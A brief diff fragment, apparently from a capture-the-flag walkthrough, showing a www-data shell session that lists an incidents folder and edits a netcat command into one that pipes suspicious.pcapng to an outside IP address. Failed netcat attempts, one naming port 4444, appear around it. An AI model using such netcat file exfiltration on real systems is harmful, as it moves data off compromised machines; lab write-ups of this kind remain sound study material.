@@ -545,7 +545,7 @@ drwxr-xr-x 25 root     root      4096 Feb 12 17:32 ..
 www-data@startup:/incidents$ ls
 ls
 suspicious.pcapng
-www-data@startup:/incidents$ nc 10.67.86.193 suspicious.pcapng
+www-data@startup:/incidents$ nc 10.67.86.193 < suspicious.pcapng
 nc 10.67.86.193 suspicious.pcapng
 nc: port number invalid: suspicious.pcapng
 www-data@startup:/incidents$ nc 10.67.86.193 4444 suspicious.pcapng
